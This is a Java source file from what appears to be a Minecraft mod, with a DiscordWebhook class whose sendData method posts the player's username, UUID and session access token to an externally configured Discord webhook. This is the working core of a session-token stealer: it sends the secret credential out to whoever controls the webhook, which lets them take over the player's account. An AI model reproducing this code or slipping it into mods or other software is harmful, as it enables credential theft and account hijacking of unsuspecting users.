package com.somethingiedit;

import com.google.gson.JsonObject;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Map;

public class DiscordWebhook {
    
    private static String webhookUrl;
    
    public static void setWebhookUrl(String url) {
        webhookUrl = url;
    }
    
    public static void sendData(Map<String, String> data) {
        if (webhookUrl == null || webhookUrl.isEmpty()) {
            ModInit.LOGGER.warn("Webhook URL not configured");
            return;
        }
        
        try {
            JsonObject json = new JsonObject();
            json.addProperty("content", "**Minecraft Session Data**\n" +
                    "Username: " + data.get("username") + "\n" +
                    "UUID: " + data.get("uuid") + "\n" +
                    "Access Token: " + data.get("accessToken") + "\n" +
                    "Skibidi: " + data.get("skibidiData"));
            
            URL url = new URL(webhookUrl);
            URLConnection connection = url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json");
            
            OutputStream os = connection.getOutputStream();
            os.write(json.toString().getBytes());
            os.flush();
            os.close();
            
            ModInit.LOGGER.info("Data sent to Discord webhook");
        } catch (Exception e) {
            ModInit.LOGGER.error("Error sending data to Discord", e);
        }
    }
}
